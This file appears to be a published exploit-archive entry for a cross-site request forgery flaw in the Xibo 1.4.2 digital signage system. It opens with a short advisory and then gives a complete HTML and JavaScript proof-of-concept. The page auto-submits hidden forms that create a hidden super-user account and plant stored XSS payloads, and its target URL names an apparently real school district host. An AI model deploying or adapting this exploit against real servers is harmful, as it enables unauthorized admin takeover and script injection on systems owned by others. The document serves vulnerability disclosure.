@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/62064/info
+
+Xibo is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
+
+Xibo 1.4.2 is vulnerable; other versions may also be affected. 
+
+<html>
+<head>
+<title> Xibo - Digital Signage 1.4.2 CSRF Exploit.</title>
+<!--
+# CSRF Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators
+# Exploited by: Jacob Holcomb - Security Analyst @ Independnet Security Evaluators
+# CVE: CSRF - CVE-2013-4889, XSS - CVE-2013-4888
+# http://infosec42.blogspot.com
+# http://securityevaluators.com
+-->
+</head>
+<body>
+<h1>Please wait... </h1>
+<script type="text/javascript">
+//Add super user
+function RF1(){
+    document.write('<form name="addAdmin" target ="_blank" action="http://xibo.leland.k12.mi.us/index.php?p=user&q=AddUser&ajax=true" method="post">'+
+    '<input type="hidden" name="userid" value="0">'+
+    '<input type="hidden" name="username" value="Gimppy">'+
+    '<input type="hidden" name="password" value="ISE">'+
+    '<input type="hidden" name="email" value="Gimppy@infosec42.com">'+
+    '<input type="hidden" name="usertypeid" value="1">'+
+    '<input type="hidden" name="groupid" value="1">'+
+    '</form>');
+}
+
+//Set XSS Payloads
+function RF2(){
+    document.write('<form name="addXSS" target="_blank" action="http://xibo.leland.k12.mi.us/index.php?p=layout&q=add&ajax=true" method="post">'+
+    '<input type="hidden" name="layoutid" value="0">'+
+    '<input type="hidden" name="layout" value="Gimppy<img src=42 onerror='alert(42)'>">'+
+    '<input type="hidden" name="description" value="<iframe src='http://securityevaluators.com' width=100 height=1000</iframe>">'+
+    '<input type="hidden" name="tags" value="">'+
+    '<input type="hidden" name="templateid" value="0">'+
+    '</form>');
+}
+
+function createPage(){
+    RF1();
+    RF2();
+}
+
+function _addAdmin(){
+    document.addAdmin.submit();
+}
+
+function _addXSS(){
+    document.addXSS.submit();
+}
+
+//Called Functions
+createPage()
+   
+for (var i = 0; i < 2; i++){
+    if(i == 0){
+        window.setTimeout(_addAdmin, 0500);
+    }
+    else if(i == 1){
+        window.setTimeout(_addXSS, 1000);
+    }
+    else{
+        continue;
+    }
+}
+</script>
+</body>
+</html>
